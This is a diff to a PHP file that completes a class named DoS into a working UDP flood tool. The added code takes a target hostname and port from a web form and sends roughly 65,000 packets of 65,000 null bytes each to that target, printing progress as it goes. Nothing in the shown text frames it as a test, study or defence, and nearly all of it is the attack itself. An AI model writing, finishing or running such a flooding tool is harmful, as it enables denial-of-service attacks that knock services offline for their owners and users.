@@ -16,9 +16,11 @@
 class DoS {
 
     const DEFAULT_BYTE = "\x00";
-
     const DEFAULT_PACKETS_SIZE = 65000;
     const MAX_PACKETS_SIZE = 65000;
+
+    /** @var array */
+    protected array $data = [];
 
     /**
      * DoS Constructor.
@@ -26,6 +28,7 @@ class DoS {
      */
     public function __construct(array $data){
         $this->setData($data);
+        $this->attack();
     }
     
     /**
@@ -34,7 +37,7 @@ class DoS {
      * @param string $out
      * @return bool
      */
-    protected function set_connection_udp(string $hostname, int $port, string $out) : bool {
+    protected function open_udp_connection(string $hostname, int $port, string $out) : bool {
         $socket = fsockopen("udp://".$hostname, $port, $errno, $errstr, 15);
         if($errno and $socket){
 			throw new \Exception($errstr, $errno);
@@ -54,7 +57,14 @@ class DoS {
      * @return void
      */
     protected function attack() : void {
+        $packets = 0;
 
+        print("UPD Flood Started");
+        while(++$packets < self::MAX_PACKETS_SIZE){
+            print("Sending packet#.".$packets."<br>");
+            $this->open_udp_connection($this->getData()["hostname"], $this->getData()["port"], str_repeat(self::DEFAULT_BYTE, self::MAX_PACKETS_SIZE));
+        }
+        print("UPD Flood Finished");
     }
 
     /**
@@ -62,15 +72,31 @@ class DoS {
      * @return void
      */
     protected function setData(array $data) : void {
-
+        $this->data = $data;
     }
 
     /**
-     * @return array[]
+     * @return array
      */
     protected function getData() : array {
-        
+        return $this->data;
     }
 }
+
+if(empty($hostname = $_POST["hostname"])){
+    print("Hostname was not placed, try again");
+    return;
+}
+if(empty($port = $_POST["port"])){
+    print("Port was not placed, try again");
+    return;
+}
+
+$data = [
+    "hostname" => $hostname,
+    "port" => $port,
+];
+
+new DoS($data);
 
 ?>
